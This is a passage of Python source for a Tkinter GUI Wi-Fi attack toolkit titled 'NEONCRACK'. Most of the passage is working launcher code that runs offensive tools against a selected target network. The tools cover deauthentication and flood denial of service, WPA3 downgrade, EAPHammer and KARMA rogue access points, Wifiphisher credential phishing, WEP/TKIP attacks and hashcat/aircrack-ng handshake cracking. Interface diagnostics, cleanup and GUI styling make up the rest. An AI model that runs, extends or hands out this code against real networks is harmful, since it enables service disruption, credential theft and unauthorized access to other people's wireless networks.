    attack_proc = _launch_logged(att_out, cmd, log_file=os.path.join(CAP_DIR, f"probe_{int(time.time())}.log"), stdin=True, required_bins=["mdk4"], preview_title="Probe Flood")
    log(att_out, "[*] Probe-response flood running")
    ui_call(refresh_artifacts)

def start_wpa3_downgrade():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return

    bssid, ch, essid, enc, _ = t
    if "SAE" not in enc and "WPA3" not in enc:
        messagebox.showinfo("Not WPA3", "AP isn’t SAE")
        return

    if not _require_bins(["airmon-ng", "dragondown"], att_out):
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    logf = os.path.join(CAP_DIR, f"dragondown_{essid}_{int(time.time())}.log")
    cmd = ["dragondown", "-i", mon, "-b", bssid, "-c", ch]

    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["dragondown"], preview_title="WPA3 Downgrade")
    log(att_out, "[*] Dragonblood running")
    ui_call(refresh_artifacts)

def start_sycophant():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng", "wpa_sycophant"], att_out):
        return

    bssid, ch, _, _, _ = t
    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["wpa_sycophant", "-i", mon, "-c", ch, "-t", bssid]
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=os.path.join(CAP_DIR, f"sycophant_{int(time.time())}.log"), stdin=True, required_bins=["wpa_sycophant"], preview_title="SAE/OWE Downgrade")
    log(att_out, "[*] " + " ".join(cmd))
    ui_call(refresh_artifacts)

def start_kr00k():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return

    # kr00k-hunter is typically installed via pip and provides a CLI.
    if not _require_bins(["airmon-ng", "kr00k-hunter"], att_out):
        return

    bssid, ch, _, _, _ = t
    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["kr00k-hunter", "-i", mon, "-c", ch, "-b", bssid]
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=os.path.join(CAP_DIR, f"kr00k_{int(time.time())}.log"), stdin=True, required_bins=["kr00k-hunter"], preview_title="Kr00k Hunter")
    log(att_out, "[*] " + " ".join(cmd))
    ui_call(refresh_artifacts)

def start_eaphammer():
    iface=iface_var.get()
    if not iface:
        messagebox.showwarning("Iface","Select iface"); return
    if shutil.which("eaphammer") is None:
        messagebox.showerror("Missing","Install eaphammer"); return
    domain=simpledialog.askstring("Domain","Target AD domain (blank = rogue)",parent=root) or "evil.local"
    cmd=["eaphammer","-i",iface,"--essid","CorpEAP","--creds","--hw-mode","g","--channel","6","--domain",domain]
    logf = os.path.join(CAP_DIR, f"eaphammer_{int(time.time())}.log")
    global attack_proc; attack_proc=run_logged(cmd,att_out,logf,stdin=True)
    _record_proc("attack", attack_proc, cmd, logf)
    log(att_out,"[*] "+" ".join(cmd))

def start_eap_md5_challenge():
    iface = _require_iface(att_out)
    if not iface:
        return
    if not _require_bins(["eaphammer"], att_out):
        return

    essid = simpledialog.askstring("ESSID", "Target ESSID", parent=root)
    if not essid:
        return

    cmd = ["eaphammer", "-i", iface, "--essid", essid, "--auth-method", "eap-md5", "--hw-mode", "g", "--channel", "6"]
    logf = os.path.join(CAP_DIR, f"eap_md5_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["eaphammer"], preview_title="EAP-MD5 Challenge")
    log(att_out, "[*] EAP-MD5 Challenge attack running")
    ui_call(refresh_artifacts)

def start_auth_dos():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng", "mdk4"], att_out):
        return

    bssid, _, essid, _, _ = t
    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["mdk4", mon, "a", "-a", bssid]

    logf = os.path.join(CAP_DIR, f"auth_dos_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["mdk4"], preview_title="Authentication DoS")
    log(att_out, "[*] Authentication DoS attack running")
    ui_call(refresh_artifacts)

def start_ssid_brute_force():
    iface = _require_iface(att_out)
    if not iface:
        return
    if not _require_bins(["airmon-ng", "mdk4"], att_out):
        return

    wordlist = filedialog.askopenfilename(
        title="Select SSID wordlist",
        filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
    )
    if not wordlist:
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    t = _selected_network()
    bssid = t[0] if t else None

    cmd = ["mdk4", mon, "p", "-f", wordlist]
    if bssid:
        cmd.extend(["-t", bssid])

    logf = os.path.join(CAP_DIR, f"ssid_brute_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["mdk4"], preview_title="SSID Brute-Force")
    log(att_out, "[*] SSID Brute-Force attack running")
    ui_call(refresh_artifacts)

def start_deauth_broadcast():
    iface = _require_iface(att_out)
    if not iface:
        return
    if not _require_bins(["airmon-ng", "aireplay-ng"], att_out):
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["aireplay-ng", "--deauth", "0", mon]

    logf = os.path.join(CAP_DIR, f"deauth_broadcast_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["aireplay-ng"], preview_title="Deauthentication Flood (Broadcast)")
    log(att_out, "[*] Deauthentication Flood (Broadcast) attack running")
    ui_call(refresh_artifacts)

def start_association_flood():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng", "mdk4"], att_out):
        return

    bssid, _, essid, _, _ = t
    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["mdk4", mon, "a", "-a", bssid]

    logf = os.path.join(CAP_DIR, f"assoc_flood_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["mdk4"], preview_title="Association Flood")
    log(att_out, "[*] Association Flood attack running")
    ui_call(refresh_artifacts)

def start_mic_failure():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng", "mdk4"], att_out):
        return

    bssid, _, essid, enc, _ = t
    if "TKIP" not in enc.upper():
        messagebox.showinfo("Not TKIP", "This attack only works on TKIP-encrypted networks.")
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["mdk4", mon, "m", "-t", bssid]

    logf = os.path.join(CAP_DIR, f"mic_failure_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["mdk4"], preview_title="MIC Failure (TKIP)")
    log(att_out, "[*] MIC Failure (TKIP) attack running")
    ui_call(refresh_artifacts)

def start_80211w_downgrade():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng", "mdk4"], att_out):
        return

    bssid, ch, essid, _, _ = t
    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["mdk4", mon, "w", "-e", essid, "-c", ch]

    logf = os.path.join(CAP_DIR, f"80211w_downgrade_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["mdk4"], preview_title="802.11w Downgrade")
    log(att_out, "[*] 802.11w Downgrade attack running")
    ui_call(refresh_artifacts)

def start_caffe_latte_attack():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng", "aireplay-ng"], att_out):
        return

    bssid, _, essid, enc, _ = t
    if "WEP" not in enc.upper():
        messagebox.showinfo("Not WEP", "This attack only works on WEP-encrypted networks.")
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["aireplay-ng", "--caffe-latte", "-b", bssid, mon]

    logf = os.path.join(CAP_DIR, f"caffe_latte_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["aireplay-ng"], preview_title="Caffe-Latte Attack")
    log(att_out, "[*] Caffe-Latte attack running")
    ui_call(refresh_artifacts)

def start_hirte_attack():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng", "aireplay-ng"], att_out):
        return

    bssid, _, essid, enc, _ = t
    if "WEP" not in enc.upper():
        messagebox.showinfo("Not WEP", "This attack only works on WEP-encrypted networks.")
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["aireplay-ng", "--hirte", "-b", bssid, mon]

    logf = os.path.join(CAP_DIR, f"hirte_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["aireplay-ng"], preview_title="Hirte Attack")
    log(att_out, "[*] Hirte attack running")
    ui_call(refresh_artifacts)

def start_fragmentation_attack():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng", "aireplay-ng"], att_out):
        return

    bssid, _, essid, enc, _ = t
    if "WEP" not in enc.upper():
        messagebox.showinfo("Not WEP", "This attack only works on WEP-encrypted networks.")
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["aireplay-ng", "--fragment", "-b", bssid, mon]

    logf = os.path.join(CAP_DIR, f"fragmentation_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["aireplay-ng"], preview_title="Fragmentation Attack")
    log(att_out, "[*] Fragmentation attack running")
    ui_call(refresh_artifacts)

def start_arp_replay_attack():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return
    if not _require_bins(["airmon-ng", "aireplay-ng"], att_out):
        return

    bssid, _, essid, enc, _ = t
    if "WEP" not in enc.upper():
        messagebox.showinfo("Not WEP", "This attack only works on WEP-encrypted networks.")
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["aireplay-ng", "--arpreplay", "-b", bssid, mon]

    logf = os.path.join(CAP_DIR, f"arp_replay_{essid}_{int(time.time())}.log")
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=["aireplay-ng"], preview_title="ARP Replay Attack")
    log(att_out, "[*] ARP Replay attack running")
    ui_call(refresh_artifacts)

def start_chopchop():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return

    bssid, ch, _, enc, _ = t
    if "TKIP" not in enc.upper():
        messagebox.showinfo("Not TKIP", "AP isn’t using TKIP")
        return

    if not _require_bins(["airmon-ng", "aireplay-ng"], att_out):
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    src = "02:" + ":".join(f"{random.randint(0,255):02x}" for _ in range(5))
    cmd = ["aireplay-ng", "-4", "-b", bssid, "-h", src, mon]

    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=os.path.join(CAP_DIR, f"chopchop_{int(time.time())}.log"), stdin=True, required_bins=["aireplay-ng"], preview_title="Chop-Chop")
    log(att_out, "[*] " + " ".join(cmd))
    ui_call(refresh_artifacts)

def start_michael_reset():
    iface = _require_iface(att_out)
    if not iface:
        return
    t = _require_target(att_out)
    if not t:
        return

    if not _require_bins(["airmon-ng", "mdk4"], att_out):
        return

    bssid, ch, _, enc, _ = t
    if "TKIP" not in enc.upper():
        messagebox.showinfo("Not TKIP", "AP isn’t using TKIP")
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    cmd = ["mdk4", mon, "m", "-t", bssid]
    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=os.path.join(CAP_DIR, f"michael_{int(time.time())}.log"), stdin=True, required_bins=["mdk4"], preview_title="Michael Reset")
    log(att_out, "[*] Michael reset running")
    ui_call(refresh_artifacts)

def start_karma():
    iface = _require_iface(att_out)
    if not iface:
        return
    if not _require_bins(["airmon-ng", "dnsmasq", "iptables", "sysctl"], att_out):
        return

    uplink = simpledialog.askstring("Uplink iface", "Outbound NIC", parent=root)
    if not uplink:
        return

    set_monitor(iface, True)
    mon = iface_var.get()

    enable_nat(uplink, mon)

    # Prefer hostapd-mana when present, fallback to airbase-ng.
    if shutil.which("hostapd-mana"):
        cfg = os.path.join(CAP_DIR, "mana.conf")
        open(cfg, "w").write(f"interface={mon}\ndriver=nl80211\nssid=FreeWifi\nhw_mode=g\nchannel=6\n")
        cmd = ["hostapd-mana", cfg]
        req = ["hostapd-mana"]
    else:
        if not _require_bins(["airbase-ng"], att_out):
            return
        cmd = ["airbase-ng", "-P", "-C", "30", "-v", "FreeWifi", mon]
        req = ["airbase-ng"]

    logf = os.path.join(CAP_DIR, f"karma_{int(time.time())}.log")

    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=logf, stdin=True, required_bins=req, preview_title="KARMA")

    # DNSMasq should be cleaned up on stop.
    dns_conf = os.path.join(CAP_DIR, "karma.dnsmasq")
    open(dns_conf, "w").write(f"interface={mon}\ndhcp-range=10.0.0.20,10.0.0.250,12h\n")
    p = run(["dnsmasq", "--conf-file=" + dns_conf], box=att_out)
    aux_procs.append(p)

    log(att_out, "[*] KARMA rogue-AP running")
    ui_call(refresh_artifacts)

def start_wifiphisher():
    iface = _require_iface(att_out)
    if not iface:
        return
    if not _require_bins(["wifiphisher"], att_out):
        return

    jam_iface = simpledialog.askstring(
        "Jam iface (optional)",
        "Second NIC for jamming (blank = same)",
        parent=root,
    ) or iface

    subprocess.run(["systemctl", "stop", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    cmd = ["wifiphisher", "-aI", iface, "-eI", jam_iface]
    if jam_iface == iface:
        cmd.append("--nojamming")

    global attack_proc
    attack_proc = _launch_logged(att_out, cmd, log_file=os.path.join(CAP_DIR, f"wifiphisher_{int(time.time())}.log"), stdin=True, required_bins=["wifiphisher"], preview_title="Wifiphisher")
    log(att_out, "[*] " + " ".join(cmd))
    ui_call(refresh_artifacts)

# ───────────── crack / hash / cleaner helpers ─────────────────────────────
def browse_pcap(): pcap_var.set(filedialog.askopenfilename(filetypes=[("Capture","*.cap *.pcap *.pcapng *.hccapx")]))
def browse_word(): word_var.set(filedialog.askopenfilename(filetypes=[("Wordlist","*.txt *.lst")]))

def crack():
    cap,wl=pcap_var.get(),word_var.get()
    if not (cap and wl):
        messagebox.showwarning("Missing","Select both"); return
    if cap.endswith((".pcap",".pcapng",".cap")):
        conv=os.path.join(CAP_DIR,f"conv_{int(time.time())}.hccapx")
        run(["hcxpcapngtool","-o",conv,cap]).wait(); cap=conv
    run_logged(["hashcat","-m","22000",cap,wl,"--force"],crack_out)

def start_wpa_bruteforce():
    cap,wl=pcap_var.get(),word_var.get()
    if not (cap and wl):
        messagebox.showwarning("Missing","Select both capture file and wordlist"); return
    
    log(crack_out, f"[*] Starting WPA/WPA2 Brute-force with aircrack-ng...")
    run_logged(["aircrack-ng", "-w", wl, cap], crack_out)

def identify_hash(h):
    if shutil.which("hashid"):
        try:return subprocess.check_output(["hashid","-m",h],text=True,stderr=subprocess.DEVNULL)
        except subprocess.CalledProcessError: pass
    return {32:"Likely MD5",40:"Likely SHA-1",64:"Likely SHA-256"}.get(len(h),"Unknown")

def hashid_action():
    h=hash_input.get().strip(); hashid_out.delete("1.0",END)
    if h: hashid_out.insert(END,identify_hash(h)+"\n")

def clean_capture():
    cap=filedialog.askopenfilename(filetypes=[("pcapng","*.pcapng")])
    if not cap:return
    out=cap.replace(".pcapng","_cleaned.pcapng")
    run(["hcxpcapngtool","--cleanall","-o",out,cap]).wait()
    cleaner_out.insert(END,f"[+] Cleaned → {out}\n")

def show_stats():
    pot=os.path.expanduser("~/.hashcat/hashcat.potfile")
    utils_out.delete("1.0",END)
    if not os.path.isfile(pot):
        utils_out.insert(END,"No potfile.\n"); return
    dist=Counter(len(l.split(':',1)[1].strip()) for l in open(pot) if ':' in l)
    utils_out.insert(END,"Len | Count\n--------------\n")
    for l,c in sorted(dist.items()): utils_out.insert(END,f"{l:3} | {c}\n")

# ───────────── Dependency Doctor ──────────────────────────────────────────
def dependency_doctor():
    utils_out.delete("1.0",END)
    okB, missB = [], []
    for exe in DEP_BINS: (okB if shutil.which(exe) else missB).append(exe)
    utils_out.insert(END,"=== Binaries ===\n")
    for e in okB:   utils_out.insert(END,f"[✓] {e}\n","ok")
    for e in missB: utils_out.insert(END,f"[✗] {e}\n","miss")
    okP, missP = [], []
    for m in DEP_PKGS: (okP if importlib.util.find_spec(m) else missP).append(m)
    utils_out.insert(END,"\n=== Python packages ===\n")
    for m in okP:   utils_out.insert(END,f"[✓] {m}\n","ok")
    for m in missP: utils_out.insert(END,f"[✗] {m}\n","miss")
    utils_out.insert(END,f"\nBins {len(okB)}/{len(DEP_BINS)} | PyPkgs {len(okP)}/{len(DEP_PKGS)}\n")
    utils_out.tag_config("ok",foreground="#00ff88"); utils_out.tag_config("miss",foreground="#ff4030")

# ───────────── Utilities: admin / diagnostics ──────────────────────────────
def _launch_util(box, cmd, *, log_file=None, required_bins=None, preview_title="Utility"):
    """Like _launch_logged but doesn't modify attack/scan process state."""
    if required_bins and not _require_bins(required_bins, box):
        return _DummyProc()

    def _exec():
        return run_logged(cmd, box, log_file)

    if preview_before_run.get() and not dry_run.get():
        _show_command_preview(cmd, title=preview_title, on_execute=_exec)
        return _DummyProc()

    return _exec()


def _sysfs_read(path):
    try:
        with open(path, "r", errors="ignore") as f:
            return f.read().strip()
    except Exception:
        return None


def _iface_mac(iface):
    return _sysfs_read(f"/sys/class/net/{iface}/address")


def _iface_operstate(iface):
    return _sysfs_read(f"/sys/class/net/{iface}/operstate")


def _iface_mtu(iface):
    return _sysfs_read(f"/sys/class/net/{iface}/mtu")


def _iface_driver(iface):
    # Prefer ethtool -i when available
    if shutil.which("ethtool"):
        try:
            out = subprocess.check_output(["ethtool", "-i", iface], text=True, stderr=subprocess.STDOUT)
            for ln in out.splitlines():
                if ln.lower().startswith("driver:"):
                    return ln.split(":", 1)[1].strip() or None
        except Exception:
            pass

    # Sysfs fallback
    try:
        drv = os.path.realpath(f"/sys/class/net/{iface}/device/driver")
        if drv and os.path.basename(drv):
            return os.path.basename(drv)
    except Exception:
        pass

    return None


def _iface_ips(iface):
    ips4, ips6 = [], []
    if shutil.which("ip"):
        try:
            out4 = subprocess.check_output(["ip", "-4", "addr", "show", "dev", iface], text=True, stderr=subprocess.DEVNULL)
            for ln in out4.splitlines():
                s = ln.strip()
                if s.startswith("inet "):
                    ips4.append(s.split()[1])
        except Exception:
            pass
        try:
            out6 = subprocess.check_output(["ip", "-6", "addr", "show", "dev", iface], text=True, stderr=subprocess.DEVNULL)
            for ln in out6.splitlines():
                s = ln.strip()
                if s.startswith("inet6 "):
                    ips6.append(s.split()[1])
        except Exception:
            pass
    return ips4, ips6


def _interfering_procs():
    """Return list of (pid, name, cmdline) for common Wi-Fi managers."""
    want = {
        "networkmanager",
        "wpa_supplicant",
        "modemmanager",
        "dhclient",
        "iwd",
    }
    out = []
    try:
        for p in psutil.process_iter(attrs=["pid", "name", "cmdline"]):
            name = (p.info.get("name") or "").lower()
            if name in want:
                cmdline = " ".join(p.info.get("cmdline") or [])
                out.append((p.info.get("pid"), p.info.get("name"), cmdline))
    except Exception:
        pass
    return sorted(out, key=lambda x: (x[1] or "", x[0] or 0))


def utilities_iface_info():
    box = utils_out
    box.delete("1.0", END)

    iface = (iface_var.get() or "").strip()
    if not iface:
        log(box, "[!] Select an interface (Scan tab dropdown)")
        return

    info = iw_dev_info().get(iface, {})
    typ = info.get("type") or "?"

    mac = _iface_mac(iface) or "-"
    state = _iface_operstate(iface) or "-"
    mtu = _iface_mtu(iface) or "-"
    drv = _iface_driver(iface) or "-"
    ips4, ips6 = _iface_ips(iface)

    log(box, f"=== Interface Info ===")
    log(box, f"iface   : {iface}")
    log(box, f"type    : {typ}")
    log(box, f"state   : {state}")
    log(box, f"mtu     : {mtu}")
    log(box, f"mac     : {mac}")
    log(box, f"vendor  : {lookup_vendor(mac) if mac and mac != '-' else 'Unknown'}")
    log(box, f"driver  : {drv}")
    log(box, f"ipv4    : {', '.join(ips4) if ips4 else '-'}")
    log(box, f"ipv6    : {', '.join(ips6) if ips6 else '-'}")

    # Raw iw dev snippet (best-effort)
    if shutil.which("iw"):
        try:
            out = subprocess.check_output(["iw", "dev", iface, "info"], text=True, stderr=subprocess.STDOUT)
            log(box, "\n--- iw dev info ---")
            for ln in out.strip().splitlines()[:80]:
                log(box, ln)
        except Exception:
            pass


def utilities_vendor_lookup():
    box = utils_out
    # Do not clear log (lets users keep context)

    q = (vendor_lookup_var.get() or "").strip()
    if not q:
        # default to selected iface mac
        iface = (iface_var.get() or "").strip()
        if iface:
            q = _iface_mac(iface) or ""

    if not q:
        log(box, "[!] Enter a MAC/BSSID/OUI (Utilities tab) or select an iface")
        return

    vendor = lookup_vendor(q)
    log(box, f"[+] vendor({q}) = {vendor}")


def utilities_preflight():
    box = utils_out
    box.delete("1.0", END)

    log(box, f"=== Preflight ({datetime.now():%Y-%m-%d %H:%M:%S}) ===")

    iface = (iface_var.get() or "").strip()
    if iface:
        typ = (iw_dev_info().get(iface) or {}).get("type")
        log(box, f"iface: {iface} (type={typ or '?'})")
    else:
        log(box, "iface: <none selected>")

    # rfkill
    if shutil.which("rfkill"):
        try:
            out = subprocess.check_output(["rfkill", "list"], text=True, stderr=subprocess.STDOUT)
            log(box, "\n--- rfkill list ---")
            for ln in out.strip().splitlines()[:120]:
                log(box, ln)
        except Exception as e:
            log(box, f"[!] rfkill failed: {e}")
    else:
        log(box, "\n[*] rfkill not found")

    # Interfering processes
    procs = _interfering_procs()
    log(box, "\n--- interfering processes ---")
    if not procs:
        log(box, "(none found)")
    else:
        for pid, name, cmdline in procs:
            log(box, f"pid={pid}  {name}  {cmdline}")

    # airmon-ng check
    if shutil.which("airmon-ng"):
        try:
            out = subprocess.check_output(["airmon-ng", "check"], text=True, stderr=subprocess.STDOUT)
            log(box, "\n--- airmon-ng check ---")
            for ln in out.strip().splitlines()[:120]:
                log(box, ln)
        except Exception as e:
            log(box, f"[!] airmon-ng check failed: {e}")
    else:
        log(box, "\n[*] airmon-ng not found")


def utilities_restore_network():
    box = utils_out
    log(box, "[*] Restoring network state…")

    # Stop any running processes that may have mutated system state.
    try:
        disable_nat()
    except Exception:
        pass

    # Disable monitor mode unless Sticky is enabled.
    try:
        if monitor_flag and not sticky_mon.get():
            set_monitor(iface_var.get(), False, box=box)
    except Exception:
        pass

    # Always start Wi-Fi manager services.
    for s in _SERVICE_UNITS:
        try:
            subprocess.run(["systemctl", "start", s], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    # Ensure Killer toggle reflects restored state.
    try:
        killer_enabled.set(False)
    except Exception:
        pass

    # Re-enable NM Wi-Fi if nmcli exists.
    if shutil.which("nmcli"):
        try:
            subprocess.run(["nmcli", "radio", "wifi", "on"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            pass

    log(box, "[+] Restore complete (services started, NAT disabled, monitor reset if applicable)")


def _browse_sanity_capture():
    p = filedialog.askopenfilename(
        initialdir=os.path.abspath(CAP_DIR),
        filetypes=[
            ("Captures", "*.pcapng *.pcap *.cap"),
            ("All", "*.*"),
        ],
    )
    if p:
        cap_sanity_var.set(p)


def utilities_capture_sanity():
    box = utils_out

    cap = (cap_sanity_var.get() or "").strip()
    if not cap:
        _browse_sanity_capture()
        cap = (cap_sanity_var.get() or "").strip()

    if not cap:
        log(box, "[!] Select a capture file")
        return

    if not os.path.isfile(cap):
        log(box, f"[!] No such file: {cap}")
        return

    if not _require_bins(["hcxpcapngtool"], box, title="Capture sanity requires"):
        return

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    base = os.path.basename(cap)
    out22000 = os.path.join(CAP_DIR, f"sanity_{base}_{ts}.22000")
    logf = os.path.join(CAP_DIR, f"sanity_{base}_{ts}.log")

    cmd = ["hcxpcapngtool", "-o", out22000, cap]
    log(box, f"[*] sanity: converting → {out22000}")

    p = _launch_util(box, cmd, log_file=logf, required_bins=["hcxpcapngtool"], preview_title="Capture Sanity (hcxpcapngtool)")

    def _finish():
        try:
            if p and p.poll() is None:
                p.wait(timeout=180)
        except Exception:
            pass

        try:
            if os.path.isfile(out22000):
                sz = os.path.getsize(out22000)
                lines = 0
                try:
                    with open(out22000, "r", errors="ignore") as f:
                        for _ in f:
                            lines += 1
                except Exception:
                    lines = None

                if sz > 0:
                    log(box, f"[+] OK: produced {_fmt_size(sz)} ({lines if lines is not None else '?'} lines)")
                else:
                    log(box, "[-] No hashes extracted (0 bytes). Capture may not contain usable handshakes/PMKIDs.")
            else:
                log(box, "[-] Output .22000 was not created")
        except Exception as e:
            log(box, f"[!] sanity check post-run failed: {e}")

        try:
            ui_call(refresh_artifacts)
        except Exception:
            pass

    threading.Thread(target=_finish, daemon=True).start()

# ───────────── console sender ─────────────────────────────────────────────
def send_to_proc(_=None):
    line = input_var.get().strip()
    if not line:
        return
    if attack_proc and attack_proc.poll() is None and attack_proc.stdin:
        try:
            attack_proc.stdin.write(line + "\n")
            attack_proc.stdin.flush()
            ui_log.write(att_out, f"> {line}\n")
        except (BrokenPipeError, OSError):
            messagebox.showwarning("stdin closed", "Process no longer accepts input.")
    else:
        messagebox.showwarning("No active attack", "Start an attack first.")
    input_var.set("")

# ───────────── stop / reset ───────────────────────────────────────────────
def stop_attack():
    disable_nat(); stop_bw_monitor()

    global attack_proc, aux_procs

    # Stop primary attack process
    if attack_proc and attack_proc.poll() is None:
        _kill_proc_group(attack_proc, timeout_s=2.0)
    attack_proc = None

    # Stop any auxiliary processes we spawned (e.g. dnsmasq)
    for p in list(aux_procs):
        try:
            _kill_proc_group(p, timeout_s=1.0)
        except Exception:
            pass
    aux_procs = []

    subprocess.run(["systemctl", "start", "NetworkManager"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    restore_monitor()
    log(att_out, "[!] Attack stopped")

def reset_toolkit(exit_after=False):
    stop_attack(); stop_scan()
    killer_enabled.set(False); toggle_killer()
    subprocess.run(["systemctl","restart","wpa_supplicant"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)

    for box in (scan_out, att_out, crack_out, hashid_out, cleaner_out, utils_out):
        box.delete("1.0", END)

    for v in (target_var, pcap_var, word_var, hash_input, iface_var, nmap_target, nmap_custom, input_var):
        v.set("")

    refresh_iface_menu()
    refresh_network_tree()
    log(scan_out, "[*] Toolkit reset")
    if exit_after:
        try:
            save_config()
        except Exception:
            pass
        root.quit()

# ───────────── GUI layout ─────────────────────────────────────────────────
style = ttk.Style()
try:
    style.theme_use("clam")
except Exception:
    pass

# Global ttk look
style.configure(".", background=BGC, foreground=NEON, font=FONT)
style.configure("TFrame", background=BGC)
style.configure("TLabel", background=BGC, foreground=NEON, font=FONT)
style.configure("TNotebook", background=BGC, borderwidth=0)
style.configure(
    "TNotebook.Tab",
    background="#15152a",
    foreground=NEON,
    padding=(12, 6),
    font=("Consolas", 10, "bold"),
)
style.map(
    "TNotebook.Tab",
    background=[("selected", "#0b0b14")],
    foreground=[("selected", "white")],
)
style.configure("Nc.TLabelframe", background=BGC, foreground=NEON, bordercolor=NEON)
style.configure("Nc.TLabelframe.Label", background=BGC, foreground=NEON, font=("Consolas", 10, "bold"))

# Cyberpunk table
style.configure(
    "Nc.Treeview",
    background="#0b0b14",
    fieldbackground="#0b0b14",
    foreground=NEON,
    rowheight=22,
    bordercolor=NEON,
    relief="flat",
)
style.map(
    "Nc.Treeview",
    background=[("selected", ACCENT)],
    foreground=[("selected", "white")],
)
style.configure(
    "Nc.Treeview.Heading",
    background="#15152a",
    foreground="white",
    font=("Consolas", 10, "bold"),
)

# Top banner + main panes + status bar
_top = Frame(root, bg=BGC)
_top.pack(side=TOP, fill=X)
Label(
    _top,
    text="NEONCRACK // TOP SECRET",
    bg=BGC,
    fg=ACCENT,
    font=("Consolas", 12, "bold"),
    padx=12,
    pady=6,
).pack(side=LEFT)

# Process dashboard (top bar)
Label(_top, textvariable=scan_dash_var, bg=BGC, fg=NEON, font=("Consolas", 9)).pack(side=LEFT, padx=12)
Label(_top, textvariable=attack_dash_var, bg=BGC, fg=NEON, font=("Consolas", 9)).pack(side=LEFT, padx=12)

main_pane = ttk.PanedWindow(root, orient=VERTICAL)
main_pane.pack(side=TOP, fill=BOTH, expand=True)

status_bar = Label(
    root,
    textvariable=status_var,
    bg="#05050b",
    fg=NEON,
    font=("Consolas", 9),
    anchor="w",
    padx=10,
    pady=4,
)
status_bar.pack(side=BOTTOM, fill=X)

# Primary controls notebook
nb = ttk.Notebook(main_pane)

tabs = {}
for k, lbl in [
    ("scan", "⚡ Scan"),
    ("attack", "⚔️ Attacks"),
    ("crack", "💥 Crack"),
    ("hash", "🔎 Hash ID"),
    ("clean", "🧹 Cleaner"),
    ("utils", "🛠 Utilities"),
    ("art", "📁 Artifacts"),
]:
    fr = Frame(nb, bg=BGC)
    nb.add(fr, text=lbl)
    tabs[k] = fr

# Dedicated logs notebook (bottom pane)
log_nb = ttk.Notebook(main_pane)
log_tabs = {}
for k, lbl in [
    ("scan", "📟 Scan Log"),
    ("attack", "📟 Attack Log"),
    ("crack", "📟 Crack Log"),
    ("hash", "📟 Hash Log"),
    ("clean", "📟 Cleaner Log"),
    ("utils", "📟 Utilities Log"),
]:
